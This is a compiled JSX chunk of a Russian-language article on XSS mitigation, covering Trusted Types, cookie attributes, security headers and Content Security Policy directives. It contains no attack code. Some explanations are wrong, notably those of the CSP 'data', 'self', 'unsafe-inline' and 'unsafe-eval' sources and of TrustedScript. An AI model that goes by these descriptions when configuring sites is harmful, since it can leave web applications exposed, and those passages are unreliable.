`,n.jsxs(e.li,{children:[n.jsx(e.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/TrustedScript",rel:"nofollow",children:n.jsx(e.code,{children:"TrustedScript"})})," — помогает проверять скрипты: код попадает в приёмник и там безопасно исполняется, так его можно проверить на наличие эксплоитов."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/TrustedScriptURL",rel:"nofollow",children:n.jsx(e.code,{children:"TrustedScriptURL"})})," — тот же ",n.jsx(e.code,{children:"TrustedScript"}),", только код будет анализироваться как URL-адрес внешнего скрипта."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/TrustedTypePolicy",rel:"nofollow",children:n.jsx(e.code,{children:"TrustedTypePolicy"})})," — определяет группу функций, которые создают объекты Trusted Type."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.a,{href:"https://developer.mozilla.org/en-US/docs/Web/API/TrustedTypePolicyFactory",rel:"nofollow",children:n.jsx(e.code,{children:"TrustedTypePolicyFactory"})})," — создаёт политики и проверяет объекты Trusted Type по созданным политикам."]}),`
`]}),`
`]}),`
`]}),`
`,n.jsx(e.h3,{id:"методы-митигации-последствий-xss",children:n.jsx(e.strong,{children:"Методы митигации последствий XSS"})}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Настройка параметров куки:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsx(e.li,{children:"Domain — определяет, на какой домен или поддомен могут быть отправлены куки. Если параметр не задан, то по умолчанию берётся доменная часть адреса документа — без поддоменов. Если домен указан явно, то поддомены включены."}),`
`,n.jsxs(e.li,{children:["Secure — принимает значение ",n.jsx(e.code,{children:"true"})," или ",n.jsx(e.code,{children:"false"}),". Если значение ",n.jsx(e.code,{children:"true"}),", то куки не будет отправляться по незащищённому HTTP-протоколу — это сделано для защиты от атак типа MITM."]}),`
`,n.jsxs(e.li,{children:["Path — определяет, для какого пути будет отправляться куки. Атрибут указывает URL, который должен быть в запрашиваемом ресурсе на момент отправки заголовка ",n.jsx(e.code,{children:"Cookie"}),". Символ ",n.jsx(e.code,{children:"/"})," интерпретируется как разделитель в URL-пути, подпути также будут учитываться. Например, если ",n.jsx(e.code,{children:"Path=/api"}),", то куки-файл будет отправлен и на ",n.jsx(e.code,{children:"/api/faq api/faq/help /api"}),", но не будет отправлен на ",n.jsx(e.code,{children:"/api_v2 /web /about/api /market"}),"."]}),`
`,n.jsx(e.li,{children:"SameSite — используется для отправки куки в междоменных запросах."}),`
`,n.jsxs(e.li,{children:["Expires — устанавливает время действия куки. При достижении лимита указанного в ",n.jsx(e.code,{children:"Expires"})," куки-файл будет удалён."]}),`
`,n.jsxs(e.li,{children:["HttpOnly. Если установить параметр ",n.jsx(e.code,{children:"HttpOnly"})," для куки, то злоумышленник не сможет получить доступ к куки из JavaScript."]}),`
`]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Security Headers — HTTP-заголовки безопасности. Они сообщают браузеру, как себя вести при общении с сайтом:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"Strict-Transport-Security — заставляет сайт использовать протокол соединения HTTPS вместо HTTP."}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{children:`Strict-Transport-Security: max-age=<expire-time>; includeSubDomains\r
\r
max-age — указывает время в секундах, в течение которого содержимое заголовка будет храниться в кеше браузера.\r
includeSubDomains — если указан этот параметр, правило применяется ко всем поддоменам.
`})}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"X-Content-Type-Options — гарантирует, что типы MIME, установленные приложением, будут соблюдаться браузерами."}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{children:`X-Content-Type-Options: nosniff указывает браузеру, что не нужно изменять Content-Type загружаемых файлов.
`})}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsxs(e.p,{children:["X-Frame-Options — определяет, можно ли другим сайтам подгружать целевой сайт в ",n.jsx(e.code,{children:"iframe"}),", если директива не указана, то сайт можно подгрузить в ",n.jsx(e.code,{children:"iframe"}),"."]}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{children:`X-Frame-Options: DENY — страница не может отображаться во фрейме, независимо от того, какой сайт пытается это сделать.\r
X-Frame-Options: SAMEORIGIN — страница может отображаться только в том случае, если родительская страница имеет тот же Origin, что и сама страница. \r
X-Frame-Options: ALLOW-FROM origin — устаревшая директива. Использование этого параметра приведёт к такому же поведению, что и его отсутствие.
`})}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"X-XSS-Protection — указывает браузерам приостановить выполнение обнаруженных XSS-атак."}),`
`,n.jsx(e.pre,{children:n.jsx(e.code,{children:`X-XSS-Protection: 0 — отключить защиту от XSS.\r
X-XSS-Protection: 1 — включить фильтрацию XSS и удалить небезопасную часть.\r
X-XSS-Protection: 1; mode=block — браузер предотвращает отображение всей страницы при обнаружении XSS.\r
X-XSS-Protection: 1; report=<reporting-uri> — включить фильтрацию XSS и удаление небезопасной части, затем сообщить о нарушении по reporting-uri.
`})}),`
`]}),`
`]}),`
`]}),`
`,n.jsxs(e.li,{children:[`
`,n.jsx(e.p,{children:"CSP, или Content Security Policy, — политика безопасности контента. Механизм, который помогает обеспечить безопасность веб-приложений путём управления источниками загрузки внешних ресурсов — как JavaScript, CSS, шрифты и изображения. Помогает веб-разработчикам определить, с каких доменов разрешено загружать ресурсы на их веб-страницах. Реализуется через заголовок HTTP-ответа, позволяя веб-приложениям определять, какие ресурсы могут быть загружены на их страницах."}),`
`,n.jsx(e.p,{children:"Политика безопасности контента завязана на использовании директив — правил, которые определяют, какие ресурсы можно загружать на веб-страницу:"}),`
`,n.jsxs(e.ul,{children:[`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"self"})," — указывает, что ресурсы могут загружаться только с текущего домена. Обычно используется для ограничения загрузки ресурсов внутри ",n.jsx(e.code,{children:"iframe"}),"."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"data"})," — позволяет загружать данные только с текущего домена. Это может быть полезно для ограничения загрузки файлов куки или других чувствительных данных."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"none"})," — запрещает загрузку ресурсов. Она может использоваться для полного отключения загрузки ресурсов с определённого домена."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"wildcard"})," — используется для указания звёздочки ",n.jsx(e.code,{children:"*"})," в качестве подстановочного знака для любого количества символов в строке. Она может быть использована для загрузки ресурсов из разных доменов или для загрузки ресурсов, которые начинаются с определённой строки."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"unsafe-inline"})," — загрузка ресурсов, исполняемых в контексте содержащего элемента, возможна без предварительной загрузки."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"unsafe-eval"})," — выполнение JavaScript возможно без предварительной загрузки и проверки источника."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"https"})," — позволяет загружать ресурсы только через HTTPS-соединение."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"img-src"})," — контролирует загрузку изображений с внешних ресурсов."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"object-src"})," — контролирует источники загрузки плагинов."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"default-src"})," — определяет, откуда можно загружать контент по умолчанию. Если она не указана, то контент может загружаться с любого домена."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"script-src"})," — загружает скрипты только из разрешённых источников."]}),`
`,n.jsxs(e.li,{children:[n.jsx(e.strong,{children:"report-uri"})," — указывает URI, на который будут отправляться отчёты об ошибках CSP."]}),`
`]}),`
`]}),`
`]})]})}function j(r={}){const{wrapper:e}={...i(),...r.components};return e?n.jsx(e,{...r,children:n.jsx(s,{...r})}):s(r)}export{j as default};
